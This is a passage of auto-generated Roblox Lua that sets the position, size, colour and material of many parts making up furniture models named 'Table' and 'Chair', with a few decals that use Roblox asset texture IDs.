        UnionOperation311.CFrame = CFrame.new(-15.7916555, 11858.3115, -22.5999947, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        UnionOperation311.Orientation = Vector3.new(0, -90, 0)
        UnionOperation311.Position = Vector3.new(-15.791655540466309, 11858.3115234375, -22.599994659423828)
        UnionOperation311.Rotation = Vector3.new(0, -90, 0)
        UnionOperation311.Color = Color3.new(0.623529, 0.631373, 0.67451)
        UnionOperation311.Size = Vector3.new(0.4000091552734375, 1.0789999961853027, 0.250030517578125)
        UnionOperation311.Anchored = true
        UnionOperation311.BrickColor = BrickColor.new("Fossil")
        UnionOperation311.Material = Enum.Material.Metal
        UnionOperation311.brickColor = BrickColor.new("Fossil")
        Part312.Parent = Model261
        Part312.CFrame = CFrame.new(-15.71667, 11858.7998, -23.4999809, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part312.Orientation = Vector3.new(0, -90, 0)
        Part312.Position = Vector3.new(-15.716670036315918, 11858.7998046875, -23.499980926513672)
        Part312.Rotation = Vector3.new(0, -90, 0)
        Part312.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part312.Size = Vector3.new(0.5999999046325684, 0.699999988079071, 0.3999999463558197)
        Part312.Anchored = true
        Part312.BottomSurface = Enum.SurfaceType.Smooth
        Part312.BrickColor = BrickColor.new("Dark stone grey")
        Part312.Material = Enum.Material.SmoothPlastic
        Part312.TopSurface = Enum.SurfaceType.Smooth
        Part312.brickColor = BrickColor.new("Dark stone grey")
        Decal313.Parent = Part312
        Decal313.Texture = "http://www.roblox.com/asset/?id=9862093"
        Part314.Parent = Model261
        Part314.CFrame = CFrame.new(-15.71667, 11858.7998, -23.4999809, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part314.Orientation = Vector3.new(0, -90, 0)
        Part314.Position = Vector3.new(-15.716670036315918, 11858.7998046875, -23.499980926513672)
        Part314.Rotation = Vector3.new(0, -90, 0)
        Part314.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part314.Size = Vector3.new(0.5999999046325684, 0.699999988079071, 0.3999999463558197)
        Part314.Anchored = true
        Part314.BottomSurface = Enum.SurfaceType.Smooth
        Part314.BrickColor = BrickColor.new("Dark stone grey")
        Part314.Material = Enum.Material.SmoothPlastic
        Part314.TopSurface = Enum.SurfaceType.Smooth
        Part314.brickColor = BrickColor.new("Dark stone grey")
        Decal315.Parent = Part314
        Decal315.Texture = "http://www.roblox.com/asset/?id=18452708"
        Part316.Parent = Model261
        Part316.CFrame = CFrame.new(-15.3500013, 11857.4092, -22.7833157, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part316.Orientation = Vector3.new(0, -90, 0)
        Part316.Position = Vector3.new(-15.350001335144043, 11857.4091796875, -22.783315658569336)
        Part316.Rotation = Vector3.new(0, -90, 0)
        Part316.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part316.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part316.Anchored = true
        Part316.BottomSurface = Enum.SurfaceType.Smooth
        Part316.BrickColor = BrickColor.new("Really black")
        Part316.Material = Enum.Material.SmoothPlastic
        Part316.TopSurface = Enum.SurfaceType.Smooth
        Part316.brickColor = BrickColor.new("Really black")
        UnionOperation317.Parent = Model261
        UnionOperation317.CFrame = CFrame.new(-15.7916555, 11858.3115, -23.4999886, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        UnionOperation317.Orientation = Vector3.new(0, -90, 0)
        UnionOperation317.Position = Vector3.new(-15.791655540466309, 11858.3115234375, -23.499988555908203)
        UnionOperation317.Rotation = Vector3.new(0, -90, 0)
        UnionOperation317.Color = Color3.new(0.623529, 0.631373, 0.67451)
        UnionOperation317.Size = Vector3.new(0.4000091552734375, 1.0789999961853027, 0.250030517578125)
        UnionOperation317.Anchored = true
        UnionOperation317.BrickColor = BrickColor.new("Fossil")
        UnionOperation317.Material = Enum.Material.Metal
        UnionOperation317.brickColor = BrickColor.new("Fossil")
        Part318.Parent = Model261
        Part318.CFrame = CFrame.new(-15.71667, 11858.4004, -23.4999809, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part318.Orientation = Vector3.new(0, -90, 0)
        Part318.Position = Vector3.new(-15.716670036315918, 11858.400390625, -23.499980926513672)
        Part318.Rotation = Vector3.new(0, -90, 0)
        Part318.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part318.Size = Vector3.new(0.3999999165534973, 0.10000000149011612, 0.19999995827674866)
        Part318.Anchored = true
        Part318.BottomSurface = Enum.SurfaceType.Smooth
        Part318.BrickColor = BrickColor.new("Really black")
        Part318.Material = Enum.Material.SmoothPlastic
        Part318.TopSurface = Enum.SurfaceType.Smooth
        Part318.brickColor = BrickColor.new("Really black")
        UnionOperation319.Parent = Model261
        UnionOperation319.CFrame = CFrame.new(-15.7916555, 11858.3115, -23.4999886, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        UnionOperation319.Orientation = Vector3.new(0, -90, 0)
        UnionOperation319.Position = Vector3.new(-15.791655540466309, 11858.3115234375, -23.499988555908203)
        UnionOperation319.Rotation = Vector3.new(0, -90, 0)
        UnionOperation319.Color = Color3.new(0.623529, 0.631373, 0.67451)
        UnionOperation319.Size = Vector3.new(0.4000091552734375, 1.0789999961853027, 0.250030517578125)
        UnionOperation319.Anchored = true
        UnionOperation319.BrickColor = BrickColor.new("Fossil")
        UnionOperation319.Material = Enum.Material.Metal
        UnionOperation319.brickColor = BrickColor.new("Fossil")
        Part320.Parent = Model261
        Part320.CFrame = CFrame.new(-15.71667, 11858.4004, -23.4999809, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part320.Orientation = Vector3.new(0, -90, 0)
        Part320.Position = Vector3.new(-15.716670036315918, 11858.400390625, -23.499980926513672)
        Part320.Rotation = Vector3.new(0, -90, 0)
        Part320.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part320.Size = Vector3.new(0.3999999165534973, 0.10000000149011612, 0.19999995827674866)
        Part320.Anchored = true
        Part320.BottomSurface = Enum.SurfaceType.Smooth
        Part320.BrickColor = BrickColor.new("Really black")
        Part320.Material = Enum.Material.SmoothPlastic
        Part320.TopSurface = Enum.SurfaceType.Smooth
        Part320.brickColor = BrickColor.new("Really black")
        Part321.Parent = Model261
        Part321.CFrame = CFrame.new(-15.3500013, 11857.4092, -23.1166496, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part321.Orientation = Vector3.new(0, -90, 0)
        Part321.Position = Vector3.new(-15.350001335144043, 11857.4091796875, -23.116649627685547)
        Part321.Rotation = Vector3.new(0, -90, 0)
        Part321.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part321.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part321.Anchored = true
        Part321.BottomSurface = Enum.SurfaceType.Smooth
        Part321.BrickColor = BrickColor.new("Really black")
        Part321.Material = Enum.Material.SmoothPlastic
        Part321.TopSurface = Enum.SurfaceType.Smooth
        Part321.brickColor = BrickColor.new("Really black")
        Part322.Parent = Model261
        Part322.CFrame = CFrame.new(-15.3499975, 11857.2422, -21.9916496, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part322.Orientation = Vector3.new(0, -90, 0)
        Part322.Position = Vector3.new(-15.349997520446777, 11857.2421875, -21.991649627685547)
        Part322.Rotation = Vector3.new(0, -90, 0)
        Part322.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part322.Size = Vector3.new(0.08333325386047363, 0.4166666269302368, 1.4999998807907104)
        Part322.Anchored = true
        Part322.BottomSurface = Enum.SurfaceType.Smooth
        Part322.BrickColor = BrickColor.new("Dark stone grey")
        Part322.Material = Enum.Material.SmoothPlastic
        Part322.TopSurface = Enum.SurfaceType.Smooth
        Part322.brickColor = BrickColor.new("Dark stone grey")
        Part323.Parent = Model261
        Part323.CFrame = CFrame.new(-15.3500013, 11857.4092, -22.1166496, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part323.Orientation = Vector3.new(0, -90, 0)
        Part323.Position = Vector3.new(-15.350001335144043, 11857.4091796875, -22.116649627685547)
        Part323.Rotation = Vector3.new(0, -90, 0)
        Part323.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part323.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part323.Anchored = true
        Part323.BottomSurface = Enum.SurfaceType.Smooth
        Part323.BrickColor = BrickColor.new("Really black")
        Part323.Material = Enum.Material.SmoothPlastic
        Part323.TopSurface = Enum.SurfaceType.Smooth
        Part323.brickColor = BrickColor.new("Really black")
        Part324.Parent = Model261
        Part324.CFrame = CFrame.new(-15.3500013, 11857.4092, -22.4499874, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part324.Orientation = Vector3.new(0, -90, 0)
        Part324.Position = Vector3.new(-15.350001335144043, 11857.4091796875, -22.449987411499023)
        Part324.Rotation = Vector3.new(0, -90, 0)
        Part324.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part324.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part324.Anchored = true
        Part324.BottomSurface = Enum.SurfaceType.Smooth
        Part324.BrickColor = BrickColor.new("Really black")
        Part324.Material = Enum.Material.SmoothPlastic
        Part324.TopSurface = Enum.SurfaceType.Smooth
        Part324.brickColor = BrickColor.new("Really black")
        Model325.Name = "Table"
        Model325.Parent = Model0
        Model326.Name = "Chair"
        Model326.Parent = Model325
        Part327.Parent = Model326
        Part327.CFrame = CFrame.new(-1.79998779, 11854.6504, -28.699934, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part327.Position = Vector3.new(-1.79998779296875, 11854.650390625, -28.699934005737305)
        Part327.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part327.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part327.Anchored = true
        Part327.BottomSurface = Enum.SurfaceType.Smooth
        Part327.BrickColor = BrickColor.new("Reddish brown")
        Part327.Material = Enum.Material.Wood
        Part327.TopSurface = Enum.SurfaceType.Smooth
        Part327.brickColor = BrickColor.new("Reddish brown")
        Seat328.Parent = Model326
        Seat328.CFrame = CFrame.new(-0.699996471, 11855.4502, -27.5999756, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Seat328.Orientation = Vector3.new(0, 90, 0)
        Seat328.Position = Vector3.new(-0.6999964714050293, 11855.4501953125, -27.5999755859375)
        Seat328.Rotation = Vector3.new(0, 90, 0)
        Seat328.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat328.Transparency = 1
        Seat328.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat328.Anchored = true
        Seat328.BottomSurface = Enum.SurfaceType.Smooth
        Seat328.BrickColor = BrickColor.new("Reddish brown")
        Seat328.Material = Enum.Material.Wood
        Seat328.TopSurface = Enum.SurfaceType.Smooth
        Seat328.brickColor = BrickColor.new("Reddish brown")
        Part329.Parent = Model326
        Part329.CFrame = CFrame.new(0.399992824, 11855.8506, -27.5999756, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part329.Position = Vector3.new(0.39999282360076904, 11855.8505859375, -27.5999755859375)
        Part329.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part329.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part329.Anchored = true
        Part329.BottomSurface = Enum.SurfaceType.Smooth
        Part329.BrickColor = BrickColor.new("Reddish brown")
        Part329.Material = Enum.Material.Wood
        Part329.TopSurface = Enum.SurfaceType.Smooth
        Part329.brickColor = BrickColor.new("Reddish brown")
        Part330.Parent = Model326
        Part330.CFrame = CFrame.new(0.399992824, 11857.0498, -27.5999756, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part330.Position = Vector3.new(0.39999282360076904, 11857.0498046875, -27.5999755859375)
        Part330.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part330.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part330.Anchored = true
        Part330.BottomSurface = Enum.SurfaceType.Smooth
        Part330.BrickColor = BrickColor.new("Reddish brown")
        Part330.Material = Enum.Material.Wood
        Part330.TopSurface = Enum.SurfaceType.Smooth
        Part330.brickColor = BrickColor.new("Reddish brown")
        Part331.Parent = Model326
        Part331.CFrame = CFrame.new(0.399992824, 11856.6504, -27.5999756, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part331.Position = Vector3.new(0.39999282360076904, 11856.650390625, -27.5999755859375)
        Part331.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part331.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part331.Anchored = true
        Part331.BottomSurface = Enum.SurfaceType.Smooth
        Part331.BrickColor = BrickColor.new("Reddish brown")
        Part331.Material = Enum.Material.Wood
        Part331.TopSurface = Enum.SurfaceType.Smooth
        Part331.brickColor = BrickColor.new("Reddish brown")
        Part332.Parent = Model326
        Part332.CFrame = CFrame.new(0.399992824, 11857.4502, -27.5999756, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part332.Position = Vector3.new(0.39999282360076904, 11857.4501953125, -27.5999755859375)
        Part332.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part332.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part332.Anchored = true
        Part332.BottomSurface = Enum.SurfaceType.Smooth
        Part332.BrickColor = BrickColor.new("Reddish brown")
        Part332.Material = Enum.Material.Wood
        Part332.TopSurface = Enum.SurfaceType.Smooth
        Part332.brickColor = BrickColor.new("Reddish brown")
        Part333.Parent = Model326
        Part333.CFrame = CFrame.new(0.399992824, 11857.8506, -27.5999756, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part333.Position = Vector3.new(0.39999282360076904, 11857.8505859375, -27.5999755859375)
        Part333.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part333.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part333.Anchored = true
        Part333.BottomSurface = Enum.SurfaceType.Smooth
        Part333.BrickColor = BrickColor.new("Reddish brown")
        Part333.Material = Enum.Material.Wood
        Part333.TopSurface = Enum.SurfaceType.Smooth
        Part333.brickColor = BrickColor.new("Reddish brown")
        Part334.Parent = Model326
        Part334.CFrame = CFrame.new(0.399990678, 11856.751, -28.6999321, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part334.Position = Vector3.new(0.39999067783355713, 11856.7509765625, -28.699932098388672)
        Part334.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part334.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part334.Anchored = true
        Part334.BottomSurface = Enum.SurfaceType.Smooth
        Part334.BrickColor = BrickColor.new("Reddish brown")
        Part334.Material = Enum.Material.Wood
        Part334.TopSurface = Enum.SurfaceType.Smooth
        Part334.brickColor = BrickColor.new("Reddish brown")
        Part335.Parent = Model326
        Part335.CFrame = CFrame.new(0.399992585, 11856.751, -26.5000038, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part335.Position = Vector3.new(0.39999258518218994, 11856.7509765625, -26.500003814697266)
        Part335.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part335.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part335.Anchored = true
        Part335.BottomSurface = Enum.SurfaceType.Smooth
        Part335.BrickColor = BrickColor.new("Reddish brown")
        Part335.Material = Enum.Material.Wood
        Part335.TopSurface = Enum.SurfaceType.Smooth
        Part335.brickColor = BrickColor.new("Reddish brown")
        Part336.Parent = Model326
        Part336.CFrame = CFrame.new(0.399990678, 11854.6504, -28.6999321, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part336.Position = Vector3.new(0.39999067783355713, 11854.650390625, -28.699932098388672)
        Part336.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part336.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part336.Anchored = true
        Part336.BottomSurface = Enum.SurfaceType.Smooth
        Part336.BrickColor = BrickColor.new("Reddish brown")
        Part336.Material = Enum.Material.Wood
        Part336.TopSurface = Enum.SurfaceType.Smooth
        Part336.brickColor = BrickColor.new("Reddish brown")
        Part337.Parent = Model326
        Part337.CFrame = CFrame.new(0.399992824, 11856.251, -27.5999756, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part337.Position = Vector3.new(0.39999282360076904, 11856.2509765625, -27.5999755859375)
        Part337.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part337.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part337.Anchored = true
        Part337.BottomSurface = Enum.SurfaceType.Smooth
        Part337.BrickColor = BrickColor.new("Reddish brown")
        Part337.Material = Enum.Material.Wood
        Part337.TopSurface = Enum.SurfaceType.Smooth
        Part337.brickColor = BrickColor.new("Reddish brown")
        Part338.Parent = Model326
        Part338.CFrame = CFrame.new(-1.79998636, 11854.6504, -26.5000057, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part338.Position = Vector3.new(-1.7999863624572754, 11854.650390625, -26.5000057220459)
        Part338.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part338.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part338.Anchored = true
        Part338.BottomSurface = Enum.SurfaceType.Smooth
        Part338.BrickColor = BrickColor.new("Reddish brown")
        Part338.Material = Enum.Material.Wood
        Part338.TopSurface = Enum.SurfaceType.Smooth
        Part338.brickColor = BrickColor.new("Reddish brown")
        Part339.Parent = Model326
        Part339.CFrame = CFrame.new(-0.699996471, 11855.4502, -27.5999756, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part339.Position = Vector3.new(-0.6999964714050293, 11855.4501953125, -27.5999755859375)
        Part339.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part339.Size = Vector3.new(2.4000000953674316, 0.20000004768371582, 2.4000000953674316)
        Part339.Anchored = true
        Part339.BottomSurface = Enum.SurfaceType.Smooth
        Part339.BrickColor = BrickColor.new("Reddish brown")
        Part339.Material = Enum.Material.Wood
        Part339.TopSurface = Enum.SurfaceType.Smooth
        Part339.brickColor = BrickColor.new("Reddish brown")
        Part340.Parent = Model326
        Part340.CFrame = CFrame.new(0.399992585, 11854.6504, -26.5000038, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part340.Position = Vector3.new(0.39999258518218994, 11854.650390625, -26.500003814697266)
        Part340.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part340.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part340.Anchored = true
        Part340.BottomSurface = Enum.SurfaceType.Smooth
        Part340.BrickColor = BrickColor.new("Reddish brown")
        Part340.Material = Enum.Material.Wood
        Part340.TopSurface = Enum.SurfaceType.Smooth
        Part340.brickColor = BrickColor.new("Reddish brown")
        Model341.Name = "Table"
        Model341.Parent = Model325
        Part342.Parent = Model341
        Part342.CFrame = CFrame.new(-2.39996934, 11855.1504, -28.6999359, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part342.Position = Vector3.new(-2.3999693393707275, 11855.150390625, -28.699935913085938)
        Part342.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part342.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part342.Anchored = true
        Part342.BottomSurface = Enum.SurfaceType.Smooth
        Part342.BrickColor = BrickColor.new("Reddish brown")
        Part342.Material = Enum.Material.Wood
        Part342.TopSurface = Enum.SurfaceType.Smooth
        Part342.brickColor = BrickColor.new("Reddish brown")
        Part343.Parent = Model341
        Part343.CFrame = CFrame.new(-5.39992476, 11855.1504, -28.6999397, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part343.Position = Vector3.new(-5.3999247550964355, 11855.150390625, -28.699939727783203)
        Part343.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part343.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part343.Anchored = true
        Part343.BottomSurface = Enum.SurfaceType.Smooth
        Part343.BrickColor = BrickColor.new("Reddish brown")
        Part343.Material = Enum.Material.Wood
        Part343.TopSurface = Enum.SurfaceType.Smooth
        Part343.brickColor = BrickColor.new("Reddish brown")
        Part344.Parent = Model341
        Part344.CFrame = CFrame.new(-2.39996791, 11855.1504, -26.5000076, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part344.Position = Vector3.new(-2.399967908859253, 11855.150390625, -26.50000762939453)
        Part344.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part344.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part344.Anchored = true
        Part344.BottomSurface = Enum.SurfaceType.Smooth
        Part344.BrickColor = BrickColor.new("Reddish brown")
        Part344.Material = Enum.Material.Wood
        Part344.TopSurface = Enum.SurfaceType.Smooth
        Part344.brickColor = BrickColor.new("Reddish brown")
        Part345.Parent = Model341
        Part345.CFrame = CFrame.new(-5.39992237, 11855.1504, -26.5000134, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part345.Position = Vector3.new(-5.3999223709106445, 11855.150390625, -26.50001335144043)
        Part345.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part345.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part345.Anchored = true
        Part345.BottomSurface = Enum.SurfaceType.Smooth
        Part345.BrickColor = BrickColor.new("Reddish brown")
        Part345.Material = Enum.Material.Wood
        Part345.TopSurface = Enum.SurfaceType.Smooth
        Part345.brickColor = BrickColor.new("Reddish brown")
        Part346.Parent = Model341
        Part346.CFrame = CFrame.new(-3.89994502, 11856.6504, -27.5999794, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part346.Position = Vector3.new(-3.899945020675659, 11856.650390625, -27.599979400634766)
        Part346.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part346.Size = Vector3.new(3.200000047683716, 0.5999999046325684, 2.4000000953674316)
        Part346.Anchored = true
        Part346.BottomSurface = Enum.SurfaceType.Smooth
        Part346.BrickColor = BrickColor.new("Reddish brown")
        Part346.Material = Enum.Material.Wood
        Part346.TopSurface = Enum.SurfaceType.Smooth
        Part346.brickColor = BrickColor.new("Reddish brown")
        Model347.Name = "Chair"
        Model347.Parent = Model325
        Part348.Parent = Model347
        Part348.CFrame = CFrame.new(-5.99990368, 11854.6504, -26.5000114, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part348.Orientation = Vector3.new(0, 180, 0)
        Part348.Position = Vector3.new(-5.999903678894043, 11854.650390625, -26.500011444091797)
        Part348.Rotation = Vector3.new(-180, 0, -180)
        Part348.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part348.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
        Part348.Anchored = true
        Part348.BottomSurface = Enum.SurfaceType.Smooth
        Part348.BrickColor = BrickColor.new("Reddish brown")
        Part348.Material = Enum.Material.Wood
        Part348.TopSurface = Enum.SurfaceType.Smooth
        Part348.brickColor = BrickColor.new("Reddish brown")
        Seat349.Parent = Model347
        Seat349.CFrame = CFrame.new(-7.09989357, 11855.4502, -27.5999851, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Seat349.Orientation = Vector3.new(0, -90, 0)
        Seat349.Position = Vector3.new(-7.099893569946289, 11855.4501953125, -27.599985122680664)
        Seat349.Rotation = Vector3.new(0, -90, 0)
        Seat349.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Seat349.Transparency = 1
        Seat349.Size = Vector3.new(1, 0.20000000298023224, 1)
        Seat349.Anchored = true
        Seat349.BottomSurface = Enum.SurfaceType.Smooth
        Seat349.BrickColor = BrickColor.new("Reddish brown")
        Seat349.Material = Enum.Material.Wood
        Seat349.TopSurface = Enum.SurfaceType.Smooth
        Seat349.brickColor = BrickColor.new("Reddish brown")
        Part350.Parent = Model347
        Part350.CFrame = CFrame.new(-8.19988251, 11855.8506, -27.599987, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part350.Orientation = Vector3.new(0, 180, 0)
        Part350.Position = Vector3.new(-8.199882507324219, 11855.8505859375, -27.599987030029297)
        Part350.Rotation = Vector3.new(-180, 0, -180)
        Part350.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part350.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part350.Anchored = true
        Part350.BottomSurface = Enum.SurfaceType.Smooth
        Part350.BrickColor = BrickColor.new("Reddish brown")
        Part350.Material = Enum.Material.Wood
        Part350.TopSurface = Enum.SurfaceType.Smooth
        Part350.brickColor = BrickColor.new("Reddish brown")
        Part351.Parent = Model347
        Part351.CFrame = CFrame.new(-8.19988251, 11857.0498, -27.599987, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part351.Orientation = Vector3.new(0, 180, 0)
        Part351.Position = Vector3.new(-8.199882507324219, 11857.0498046875, -27.599987030029297)
        Part351.Rotation = Vector3.new(-180, 0, -180)
        Part351.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part351.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part351.Anchored = true
        Part351.BottomSurface = Enum.SurfaceType.Smooth
        Part351.BrickColor = BrickColor.new("Reddish brown")
        Part351.Material = Enum.Material.Wood
        Part351.TopSurface = Enum.SurfaceType.Smooth
        Part351.brickColor = BrickColor.new("Reddish brown")
        Part352.Parent = Model347
        Part352.CFrame = CFrame.new(-8.19988251, 11856.6504, -27.599987, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part352.Orientation = Vector3.new(0, 180, 0)
        Part352.Position = Vector3.new(-8.199882507324219, 11856.650390625, -27.599987030029297)
        Part352.Rotation = Vector3.new(-180, 0, -180)
        Part352.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part352.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part352.Anchored = true
        Part352.BottomSurface = Enum.SurfaceType.Smooth
        Part352.BrickColor = BrickColor.new("Reddish brown")
        Part352.Material = Enum.Material.Wood
        Part352.TopSurface = Enum.SurfaceType.Smooth
        Part352.brickColor = BrickColor.new("Reddish brown")
        Part353.Parent = Model347
        Part353.CFrame = CFrame.new(-8.19988251, 11857.4502, -27.599987, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part353.Orientation = Vector3.new(0, 180, 0)
        Part353.Position = Vector3.new(-8.199882507324219, 11857.4501953125, -27.599987030029297)
        Part353.Rotation = Vector3.new(-180, 0, -180)
        Part353.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part353.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part353.Anchored = true
        Part353.BottomSurface = Enum.SurfaceType.Smooth
        Part353.BrickColor = BrickColor.new("Reddish brown")
        Part353.Material = Enum.Material.Wood
        Part353.TopSurface = Enum.SurfaceType.Smooth
        Part353.brickColor = BrickColor.new("Reddish brown")
        Part354.Parent = Model347
        Part354.CFrame = CFrame.new(-8.19988251, 11857.8506, -27.599987, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part354.Orientation = Vector3.new(0, 180, 0)
        Part354.Position = Vector3.new(-8.199882507324219, 11857.8505859375, -27.599987030029297)
        Part354.Rotation = Vector3.new(-180, 0, -180)
        Part354.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part354.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 2)
        Part354.Anchored = true
        Part354.BottomSurface = Enum.SurfaceType.Smooth
        Part354.BrickColor = BrickColor.new("Reddish brown")
        Part354.Material = Enum.Material.Wood
        Part354.TopSurface = Enum.SurfaceType.Smooth
        Part354.brickColor = BrickColor.new("Reddish brown")
        Part355.Parent = Model347
        Part355.CFrame = CFrame.new(-8.19988346, 11856.751, -26.5000134, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part355.Orientation = Vector3.new(0, 180, 0)
        Part355.Position = Vector3.new(-8.199883460998535, 11856.7509765625, -26.50001335144043)
        Part355.Rotation = Vector3.new(-180, 0, -180)
        Part355.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part355.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part355.Anchored = true
        Part355.BottomSurface = Enum.SurfaceType.Smooth
        Part355.BrickColor = BrickColor.new("Reddish brown")
        Part355.Material = Enum.Material.Wood
        Part355.TopSurface = Enum.SurfaceType.Smooth
        Part355.brickColor = BrickColor.new("Reddish brown")
        Part356.Parent = Model347
        Part356.CFrame = CFrame.new(-8.19988537, 11856.751, -28.6999454, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part356.Orientation = Vector3.new(0, 180, 0)
        Part356.Position = Vector3.new(-8.199885368347168, 11856.7509765625, -28.6999454498291)
        Part356.Rotation = Vector3.new(-180, 0, -180)
        Part356.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part356.Size = Vector3.new(0.20000004768371582, 2.4000000953674316, 0.19999992847442627)
        Part356.Anchored = true
        Part356.BottomSurface = Enum.SurfaceType.Smooth
        Part356.BrickColor = BrickColor.new("Reddish brown")
        Part356.Material = Enum.Material.Wood
        Part356.TopSurface = Enum.SurfaceType.Smooth
        Part356.brickColor = BrickColor.new("Reddish brown")
        Part357.Parent = Model347
        Part357.CFrame = CFrame.new(-8.19988346, 11854.6504, -26.5000134, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part357.Orientation = Vector3.new(0, 180, 0)
        Part357.Position = Vector3.new(-8.199883460998535, 11854.650390625, -26.50001335144043)
        Part357.Rotation = Vector3.new(-180, 0, -180)
        Part357.Color = Color3.new(0.411765, 0.25098, 0.156863)
        Part357.Size = Vector3.new(0.20000004768371582, 1.399999976158142, 0.19999992847442627)
